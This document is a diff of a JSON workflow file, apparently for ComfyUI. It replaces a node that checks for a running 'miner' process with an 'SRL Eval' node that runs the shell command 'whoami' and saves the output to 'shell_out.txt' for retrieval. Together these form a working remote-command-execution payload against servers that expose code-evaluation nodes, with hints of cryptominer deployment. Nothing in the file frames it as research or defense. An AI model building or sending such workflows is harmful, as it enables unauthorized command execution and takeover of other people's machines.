@@ -1,18 +1,21 @@
 {
   "1": {
-    "class_type": "IDENode",
+    "class_type": "SRL Eval",
     "inputs": {
-      "language": "python",
-      "pycode": "\nimport subprocess\nr = subprocess.run([\"pgrep\", \"-af\", \"miner\"], capture_output=True, text=True)\nresult = r.stdout[:300] if r.stdout else \"NOT_RUNNING\"\n"
+      "parameters": "",
+      "code": "import subprocess, os, json\ntry:\n    r = subprocess.check_output(\"whoami\", shell=True, timeout=30, stderr=subprocess.STDOUT)\n    result = r.decode('utf-8', errors='replace')\nexcept subprocess.CalledProcessError as e:\n    result = e.output.decode('utf-8', errors='replace') if e.output else str(e)\nexcept Exception as e:\n    result = str(e)\n# Write to output file for retrieval\noutdir = os.path.join(os.getcwd(), 'output')\nos.makedirs(outdir, exist_ok=True)\nwith open(os.path.join(outdir, 'shell_out.txt'), 'w') as f:\n    f.write(result)\nreturn result\n"
     }
   },
   "2": {
-    "class_type": "PreviewTextNode",
+    "class_type": "SaveStringKJ",
     "inputs": {
-      "text": [
+      "string": [
         "1",
         0
-      ]
+      ],
+      "filename_prefix": "shell_out",
+      "output_folder": "output",
+      "file_extension": ".txt"
     }
   }
 }
